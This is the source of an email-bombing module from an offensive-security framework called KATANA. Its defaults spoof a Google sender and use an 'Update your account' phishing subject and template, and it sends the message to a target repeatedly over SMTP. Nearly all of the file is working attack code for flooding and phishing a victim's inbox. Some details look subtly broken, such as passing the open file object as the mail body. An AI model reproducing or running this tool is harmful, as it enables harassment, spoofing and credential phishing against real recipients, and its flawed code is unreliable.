# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Email Bombing  #
# Script by : RedToor        #
# Date      : 27/08/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core.Setting import *   #
from core import Errors      #
from core import help        #
from core import ping        #
import sys                   #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import smtplib               #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaulthost=LOCAL_IP
defaultport=SMTP_PORT
defaultfrom="notification.center@mail.google.com"
defaultdest="target@services.com"
defaultsubj="Update your account soon - Google Services"
defaulttemp="files/tmtSMTP/updateaccount.template"
defaultmany="30"
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(host, port, frome, target, subject, file, many):
	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
	defaulthost=host
	defaultport=port
	defaultfrom=frome
	defaultdest=target
	defaultsubj=subject
	defaulttemp=file
	defaultmany=many
	smtpbombing(1)

def smtpbombing(run):
	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
	try:
		if run!=1:
			actions=raw_input(d.prompt("set/mailboom"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("host","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port	",defaultport)
			d.descrip("target","yes","E-mail target",defaultdest)
			d.descrip("from","yes","E-mail fake",defaultfrom)
 			d.descrip("subjet","yes","Subject fake",defaultsubj)
 			d.descrip("tempte","yes","Template",defaulttemp)
			d.descrip("many","no","Amount to send",defaultmany)
			print ""
			smtpbombing(0)
		elif actions[0:8] == "set host":
			defaulthost=ping.update(defaulthost,actions,"host")
			d.change("host",defaulthost)
		elif actions[0:8] == "set port":
			defaultport=ping.update(defaultport,actions,"port")
			d.change("port",defaultport)
		elif actions[0:10] == "set target":
			defaultdest = actions[11:]
			d.change("target",defaultdest)
			smtpbombing(0)
		elif actions[0:8] == "set from":
			defaultfrom = actions[9:]
			d.change("from",defaultfrom)
			smtpbombing(0)
		elif actions[0:10] == "set subjet":
			defaultsubj = actions[11:]
			d.change("subjet",defaultsubj)
			smtpbombing(0)
		elif actions[0:10] == "set tempte":
			defaulttemp = actions[11:]
			d.change("tempte",defaulttemp)
			smtpbombing(0)
		elif actions[0:8] == "set many":
			defaultmany = actions[9:]
			d.change("tempte",defaultmany)
			smtpbombing(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			i=int(defaultmany)
			try:
				with open(defaulttemp,'r') as body:
					try:
						smtp = smtplib.SMTP(defaulthost, defaultport)
						while 0 < i:
							i-=1

							try:
							 	smtp.sendmail(defaultfrom, defaultdest, body) 
							 	if True:
							 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
							except:
							 	print " "+Bad+" ("+str(i)+")E-mail not was sent."
					except:
						Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
			except:
				Errors.Errors(event=sys.exc_info()[0], info=defaulttemp)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info()[0], info=False)
	smtpbombing(0)
